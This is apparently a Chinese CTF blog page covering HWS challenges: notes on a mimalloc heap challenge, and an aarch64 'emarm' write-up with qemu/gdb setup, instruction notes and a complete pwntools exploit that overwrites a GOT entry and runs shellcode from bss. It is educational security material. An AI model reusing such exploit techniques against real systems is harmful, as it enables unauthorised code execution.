<p>exp中的这个地方还把<code>_IO_write_end</code>和<code>_IO_buf_base</code>给改了，但是经过测试发现是不必要的。stdin和stdout的内容其实算是常识了，但是老是忘，很多时候还是很有用的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/07/17/HWS2023%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/17/HWS2023%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B-pwn/" class="post-title-link" itemprop="url">HWS2023夏令营选拔赛-pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-07-17 13:17:31 / 修改时间：13:43:37" itemprop="dateCreated datePublished" datetime="2023-07-17T13:17:31+08:00">2023-07-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今年入营赛打的是常规CTF，除了Web以外的四个方向都有，不像2021年那样只有纯二进制方向的（内核、固件、pwn、re），稍微有点失望，今年打的人也不是很多的感觉</p>
<p>奈何狗肺子只会打pwn，打完之后就摆烂去了，但是个人感觉除了那道签到以外的两道pwn题目质量还是不错的，所以在这里记录一下</p>
<img src="/2023/07/17/HWS2023%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B-pwn/hws-1.jpg" class>

<h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><blockquote>
<p>保护全开，版本：Ubuntu GLIBC 2.31-0ubuntu9.8，沙箱ban了execve</p>
</blockquote>
<p>跟常规菜单堆题一样，add、show、edit、delete都有而且很常规，跟常规堆唯一的不同在于这题用的堆管理器是<code>mimalloc</code></p>
<p>add如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  __int64 chunk; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pls input the size:&quot;</span>);</span><br><span class="line">  size = ReadLL();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x500</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  chunk = mi_malloc(size);</span><br><span class="line">  <span class="keyword">if</span> ( chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Pls input Content:&quot;</span>);</span><br><span class="line">    my_read(chunk, size);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !Heap[i] &amp;&amp; !Size[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        Heap[i] = chunk;</span><br><span class="line">        Size[i] = size;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Empty&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;mi_malloc Error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delete如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> LL; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  LL = ReadLL();</span><br><span class="line">  <span class="keyword">if</span> ( LL &gt; <span class="number">0x20</span> || !Heap[LL] || !Size[LL] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid idx&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mi_free(Heap[LL]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里用到的malloc和free函数分别是<code>mi_malloc</code>和<code>mi_free</code>，网上搜一下就会发现这个是一个微软开发的堆管理器mimalloc的分配/释放函数：<a href="https://github.com/microsoft/mimalloc">mimalloc的项目地址</a></p>
<p>下发的题目附件里也给了相关共享库<code>libmimalloc.so.2</code>，这个堆管理器跟ptmalloc还是有很大区别的，</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">HWS2021入营赛复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-07-07 10:48:02" itemprop="dateCreated datePublished" datetime="2023-07-07T10:48:02+08:00">2023-07-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-07-14 10:49:15" itemprop="dateModified" datetime="2023-07-14T10:49:15+08:00">2023-07-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="PWN部分"><a href="#PWN部分" class="headerlink" title="PWN部分"></a>PWN部分</h1><h2 id="emarm"><a href="#emarm" class="headerlink" title="emarm"></a>emarm</h2><h3 id="关于调试"><a href="#关于调试" class="headerlink" title="关于调试"></a>关于调试</h3><p>到现在为止还没怎么打过异构的pwn，从这题开始记录一下</p>
<p>参考了<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h1_0">这个师傅的文章</a>，很详细</p>
<p>这题的是个aarch64架构的，环境大概要配下面这些</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ARM软件包</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gcc-arm-linux-gnueabi</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gcc-aarch64-linux-gnu</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> qemu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install qemu-user qemu-system</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gdb-multiarch 用于异构程序的调试</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gdb-multiarch</span></span><br></pre></td></tr></table></figure>

<p>在没安装软件包之前运行程序的话是这样的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./emarm</span> </span><br><span class="line">bash: ./emarm: cannot execute binary file: Exec format error</span><br></pre></td></tr></table></figure>

<p>安装完了之后是这样的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./emarm</span> </span><br><span class="line">/lib/ld-linux-aarch64.so.1: No such file or directory</span><br></pre></td></tr></table></figure>

<p>很明显是能运行了，只是缺动态链接库</p>
<p>在前面安装完ARM的软件包之后，在<code>/usr</code>目录下会出现下面这三个东西</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">/usr$</span><span class="bash"> ls</span></span><br><span class="line">aarch64-linux-gnu  arm-linux-gnueabi  arm-linux-gnueabihf</span><br></pre></td></tr></table></figure>

<p>对应的动态链接库就在里面，可以使用<code>qemu-aarch -L /usr/aarch64-linux-gnu</code>来指定，但是这里就存在一些问题，第一个是这个动态链接库的版本是对应你本机的版本的，例如Ubuntu16.04就是glibc-2.23，可能跟远程环境不一样，第二个是这里面的链接库是没调试符号的，所以调起来很难看</p>
<p>按着那个师傅的文章里讲的去下载源码然后自己编译，一方面能得到源码，另一方面能得到有调试符号的链接库文件</p>
<p>然后就可以在qemu启动时指定链接库的位置了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat run.sh </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">qemu-aarch64 \</span><br><span class="line">	-g 1234 \</span><br><span class="line">	-L ./ ./emarm</span><br></pre></td></tr></table></figure>

<p>有一点比较奇怪的是我最开始给<code>-L</code>的链接库位置是个绝对路径（跟程序不在同一目录下），但是试了下发现好像没办法加载，把编译出来的<code>lib</code>文件夹放到当前目录下，然后用<code>./</code>就可以加载，不知道为啥</p>
<p>第二个问题是我Ubuntu22.04的gdb（gdb-12）尝试去remote到这个起的程序时会崩溃，如下报错</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Starting program: /home/charon/Desktop/HWS/PWN/EMARM/emarm </span><br><span class="line">/build/gdb-ZgDh0V/gdb-12.1/gdb/i387-tdep.c:597: internal-error: i387_supply_fxsave: Assertion `tdep-&gt;num_xmm_regs &gt; 0&#x27; failed.</span><br><span class="line">A problem internal to GDB has been detected,</span><br><span class="line">further debugging may prove unreliable.</span><br><span class="line">----- Backtrace -----</span><br><span class="line">0x56402e5a2197 ???</span><br><span class="line">......</span><br><span class="line">0x56402e4cc0ef ???</span><br><span class="line">0x7f826b363d8f __libc_start_call_main</span><br><span class="line">	../sysdeps/nptl/libc_start_call_main.h:58</span><br><span class="line">0x7f826b363e3f __libc_start_main_impl</span><br><span class="line">	../csu/libc-start.c:392</span><br><span class="line">0x56402e4d1e24 ???</span><br><span class="line">0xffffffffffffffff ???</span><br><span class="line">---------------------</span><br><span class="line"></span><br><span class="line">This is a bug, please report it.  For instructions, see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br></pre></td></tr></table></figure>

<p>看起来像gdb的问题，上网搜了下好像是gdb-12会有这个问题，而且似乎没修复？解决的办法是卸载重新编译到更老版本的gdb（例如11.2）</p>
<p>搞定调试的问题后就可以正常调了</p>
<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/emarm-1.jpg" class>

<h4 id="关于架构"><a href="#关于架构" class="headerlink" title="关于架构"></a>关于架构</h4><p>刚开始接触新的架构的问题在于指令集和寄存器的熟悉，这里记录下关于aarch64的</p>
<p>首先是寄存器，aarch64有31个通用寄存器（如上图，SP也叫X30寄存器），这些寄存器也可以用作32位的（叫W0-W30）</p>
<p>此外还有一组32个用作浮点计算的寄存器，如下，<code>Bx</code>是8位寄存器、<code>Hx</code>是16位、<code>Sx</code>是32位、<code>Dx</code>是64位、<code>Qx</code>是128位，这里只做了解即可，以及跟浮点相关的汇编都是以<code>F</code>开头的</p>
<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/aarch64-2.jpg" class>

<h5 id="加载和存储"><a href="#加载和存储" class="headerlink" title="加载和存储"></a>加载和存储</h5><p>基本的加载和存储操作是：（<code>LDR</code>加载）和<code>STR</code>（存储）。这些操作在内存和通用寄存器之间传输单个值。这些指令的语法是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR&lt;Sign&gt;&lt;Size&gt;   &lt;Destination&gt;, [&lt;address&gt;]</span><br><span class="line">STR&lt;Size&gt;         &lt;Source&gt;, [&lt;address&gt;]</span><br></pre></td></tr></table></figure>

<p>存储和加载操作的大小由寄存器来决定，比如W就表示32位，X就表示64位，例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR        W0, [&lt;address&gt;]</span><br><span class="line">LDR        X0, [&lt;address&gt;]</span><br></pre></td></tr></table></figure>

<p>也可以在指令中显式地指出操作长度，下面指令中的后缀分别表示字节(B)、半字(H)、字(W)，意思是把W0的低一字节、低两字节/X0的低四字节存到addr中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">STRB       W0, [&lt;address&gt;]	# 8位</span><br><span class="line">STRH       W0, [&lt;address&gt;]	# 16位</span><br><span class="line">STRW       X0, [&lt;address&gt;]	# 32位</span><br></pre></td></tr></table></figure>

<p>ldr指令也是类似的，但是这里除了操作长度外，还涉及符号拓展</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDRB       W0, [&lt;address&gt;]  # 从addr中取出一个字节的数据，零拓展到W0对应的大小（四个字节），然后存到W0中</span><br><span class="line">LDRSB      W0, [&lt;address&gt;]	# 同上，但是用符号拓展</span><br></pre></td></tr></table></figure>

<p>接着往下，寻址方法，结合下面图片来看其实就很清晰了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LDR  W0,  [X1]			# 基址寄存器，直接取X1指向的地址</span><br><span class="line">LDR  W0,  [X1, #12]		# 偏移寻址模式，取 X1+12 的地址</span><br><span class="line">LDR  W0,  [X1, #12]!	# 预索引寻址模式，跟前面一样，只是会把 X1+12 的结果更新到X1</span><br><span class="line">LDR  W0,  [X1], #12		# 后索引寻址模式，取的是X1的地址，然后会把 X1+12 的结果更新到X1</span><br></pre></td></tr></table></figure>

<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/aarch64-1.jpg" class>

<p>此外，aarch64还有加载/存储对指令（注意是<code>LDP</code>和<code>STP</code>），如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDP  W0, W1, [X1]	# 取[X1]给W0，取[X1+4]给W1</span><br><span class="line">STP  D0, D1, [X1]	# 把D0写到[X1]，把D1写到[X1+8] (D0是64位寄存器)</span><br></pre></td></tr></table></figure>

<p>加载/存储对指令常用在堆栈操作上，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STP  X0, X1, [SP, #-16]!	# X0存到[SP-16]，X1存到[SP-8]，SP=SP-16</span><br><span class="line">LDP  X0, X1, [SP], #16		# 取[SP]给X0，取[SP+8]给X1，然后SP=SP+16</span><br></pre></td></tr></table></figure>

<h5 id="位拓展"><a href="#位拓展" class="headerlink" title="位拓展"></a>位拓展</h5><p>可以分成符号拓展<code>SXTx</code>和无符号拓展<code>UXTx</code>两种，<code>x</code>决定的是<strong>被拓展的数据的大小</strong>，而拓展到多少取决于目的操作数的寄存器，从下面这张图来看就很容易理解了</p>
<p>例如<code>SXTB    W1, W0</code>，就表示从W0中（不是<code>[W0]</code>）取出一个字节的数据，符号拓展成W1对应大小（也就是32位），然后存到W1里</p>
<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/aarch64-3.jpg" class>

<h5 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h5><p>无条件的跳转指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 这两条跳转指令都不会保存返回地址，直接jmp</span><br><span class="line">B	&lt;label&gt;		# 跳转到label处</span><br><span class="line">BR	&lt;Xn&gt;		# 跳转到Xn处</span><br><span class="line"># 这两条跳转指令会保存下一条指令的地址到链接寄存器里(LP)，从而可以在后续的流程里实现返回</span><br><span class="line">BL	&lt;label&gt;</span><br><span class="line">BLR	&lt;Xn&gt;</span><br></pre></td></tr></table></figure>

<p>条件跳转指令也类似：<code>B.&lt;cond&gt; &lt;label&gt;</code>，例如<code>B.NE    skip</code>、<code>B.EQ    label</code>等等（NE是不相等、EQ是相等）</p>
<p>条件跳转指令的cond取决于<code>PSTATE</code>寄存器中的<code>ALU</code>标志位</p>
<p>aarch64不太一样的一点在于其可以在指令中显式地指出这条指令要不要取更新<code>ALU</code>标志位，例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ADD		X0, X1, X2	# 不更新标志位</span><br><span class="line">ADDS 	X0, X1, X2	# 更新标志位</span><br></pre></td></tr></table></figure>

<h5 id="PCS"><a href="#PCS" class="headerlink" title="PCS"></a>PCS</h5><p>跟函数调用约定类似，Arm架构下称作过程调用标准 (Procedure Call Standard)，其规定了函数传参的规则和返回值保存在哪，此外不太一样的地方在于PCS还规定了在函数调用期间有哪些寄存器是不能/能被破坏的，简单来说就是有些寄存器在函数调用前后不应该变化，其做法就是会把不能被破坏的寄存器提前push到栈上，结束后再恢复</p>
<h5 id="加减乘除之类的"><a href="#加减乘除之类的" class="headerlink" title="加减乘除之类的"></a>加减乘除之类的</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ADD		X0, X1, X2		# X0 = X1 + X2</span><br><span class="line">SUB		X0, X1, X2		# X0 = X1 - X2</span><br><span class="line">ASR     X20, X20, #3	# X20 = X20 &gt;&gt; 3</span><br><span class="line">LSL		X20, X20, #3	# X20 = X20 &lt;&lt; 3</span><br><span class="line">LDR     X3, [X21,X19,LSL#3]	# 取[X21 + X19 &lt;&lt; 3]给X3</span><br></pre></td></tr></table></figure>

<h3 id="关于题目"><a href="#关于题目" class="headerlink" title="关于题目"></a>关于题目</h3><p>了解完前面说的调试问题和架构相关的问题后就可以过到题目了</p>
<p>保护如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec emarm</span><br><span class="line">[*] &#x27;/home/giantbranch/Desktop/HWS/emarm&#x27;</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>程序主逻辑如下，其实很简单的题目，<code>\x00</code>绕过随机数后用给的任意地址写改got表就行了</p>
<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/emarm-2.jpg" class>

<p>此外就是由于aarch64架构的返回方式不像x86那样用<code>leave; ret</code>来返回，所以其实是可以直接劫持got表跳回到函数中间的某一段的，按流程来看似乎也不会，这题选择跳回的点就是红框那，劫持的函数是<code>fread</code>还是<code>fclose</code>都没有什么区别（我最开始改的是fclose，发现一开始可以的，过一天后忽然又不行了，会因为一个非法地址引用崩在fread里，还不知道为啥会这样）</p>
<p>实现无限循环之后就有无限制的任意地址写了，这里还涉及到的一个点是关于qemu的，还是那个师傅的博客：</p>
<blockquote>
<p>先说说<code>qemu</code>吧，在<code>CTF</code>比赛中，绝大多数<code>ARM</code>架构的题都是在<code>qemu</code>模拟出的环境中跑的，而<code>qemu</code>有些不太安全的特性，比如它没有地址的随机化，也没有<code>NX</code>保护，即使题目所给的二进制文件开了<code>NX</code>和<code>PIE</code>保护，也只是对真机环境奏效，而在<code>qemu</code>中跑的时候，仍然相当于没有这些保护，也就是说，<code>qemu</code>中所有地址都是有可执行权限的（包括堆栈，甚至<code>bss</code>段等），然后<code>libc_base</code>和<code>elf_base</code>每次跑都是固定的，当然这个固定是指在同一个环境下，本地跑和远程跑的这个固定值极有可能不相同，因此有时候打远程仍需泄露<code>libc_base</code>这些信息（当然也可以选择爆破，一般和本地也就差一两位的样子）。</p>
</blockquote>
<p>所以如果远程是用qemu跑的程序而不是真机的话，那么就大概可以有两种思路，一个是直接在bss段上写shellcode，然后跳过去，第二个是构造一个泄露，泄露远程的libc地址，然后got表改og就行，这里我用的方法是ret2shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process([&#x27;qemu-aarch64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27;, &#x27;./&#x27;, &#x27;./emarm&#x27;])</span></span><br><span class="line">p = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;./emarm&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fread = <span class="number">0x412060</span></span><br><span class="line">fclose = <span class="number">0x412018</span></span><br><span class="line">start = <span class="number">0x4008C0</span></span><br><span class="line">main_read = <span class="number">0x400BE4</span></span><br><span class="line">bss = <span class="number">0x412090</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;passwd:&quot;</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">0x412060</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;you will success&quot;</span>, p64(main_read))</span><br><span class="line">p.sendafter(<span class="string">&quot;i leave for you bye&quot;</span>,<span class="string">b&#x27;0001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">0x412090</span>+i*<span class="number">8</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;you will success&quot;</span>, shellcode[<span class="number">0</span>+i*<span class="number">8</span>:<span class="number">8</span>+i*<span class="number">8</span>])</span><br><span class="line">	p.sendafter(<span class="string">&quot;i leave for you bye&quot;</span>,<span class="string">b&#x27;0001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">0x412090</span>+<span class="number">40</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;you will success&quot;</span>, shellcode[<span class="number">40</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;i leave for you bye&quot;</span>,<span class="string">b&#x27;0001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">0x412060</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;you will success&quot;</span>, p64(<span class="number">0x412090</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;i leave for you bye&quot;</span>,<span class="string">b&#x27;0001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>也顺便记一下起gdb的脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gdb-multiarch -q \</span><br><span class="line">        -ex &quot;file ./emarm&quot; \</span><br><span class="line">        -ex &quot;set arch aarch64&quot; \</span><br><span class="line">        -ex &quot;b *0x400C40&quot; \</span><br><span class="line">        -ex &quot;target remote :1234&quot;</span><br></pre></td></tr></table></figure>



<h2 id="Justcode"><a href="#Justcode" class="headerlink" title="Justcode"></a>Justcode</h2><p>普通的x64栈题，保护如下，此外这题是开了沙箱禁了execve的</p>
